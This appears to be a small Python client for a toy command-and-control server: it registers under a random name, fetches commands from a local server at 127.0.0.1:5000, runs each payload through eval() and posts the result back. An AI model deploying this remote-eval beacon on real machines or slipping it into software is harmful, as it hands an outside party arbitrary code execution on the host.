import requests, random, string, json, pdb


def foo():
    return 'foo'

class Client:
    
    def __init__(self, name, host, port, version='1.0'):
        self.name     = name
        self.version   = version
        self.token    = ''
        self.commands = []
        self.host     = host
        self.port     = port

    @property
    def http_server(self):
        return 'http://{host}:{port}'.format(host=self.host, port=self.port)

    def connect_server(self):
        if not self.token:
            if not self._get_token():
                raise ValueError('Unable to get token from server')
        response = requests.get(url=self.http_server + '/fetch/{name}'.format(name=self.name), data={'token': self.token})
        if response.status_code == 200:
            try:
                self.commands += [json.loads(response.text)['commands']]
                self._execute_commands()
            except KeyError as e:
                print('Unable to find key `commands` in response', e)


    def _get_token(self):
        response = requests.post(url=self.http_server  + '/connect/{name}'.format(name=client_name), data={'version': self.version})
        if response.status_code == 200:
            try:
                self.token = json.loads(response.text)['token']
                return True
            except KeyError as e:
                print('Unable to find key `token` in response', e)
            return False
        
    def _execute_commands(self):
        for command in self.commands:
            for command_name, payload in command.items():
                if payload['command'] == 'run_eval':
                    response = eval(payload['args'])
                    self._submit_stdout(response, command_name)
        # TODO Remove only executed commands
        self.commands = []

    def _submit_stdout(self, response, command_name):
        response = requests.post(url=self.http_server  + '/submit/{name}'.format(name=client_name), data={'version': self.version,
                                                                                                          'token': self.token,
                                                                                                          'stdout': response,
                                                                                                          'command': command_name})
        try:
            if response.status_code == 200 and json.loads(response.text)['status'] == 'success':
                return True
        except KeyError as e:
            print('Unable to find key `token` in response', e)
        return False

        
client_name = ''.join([random.choice(string.ascii_lowercase) for i in range(10)])
client = Client(name=client_name, host='127.0.0.1', port='5000')
print('Sending client connection with the name: {name}'.format(name=client.name))
client.connect_server()
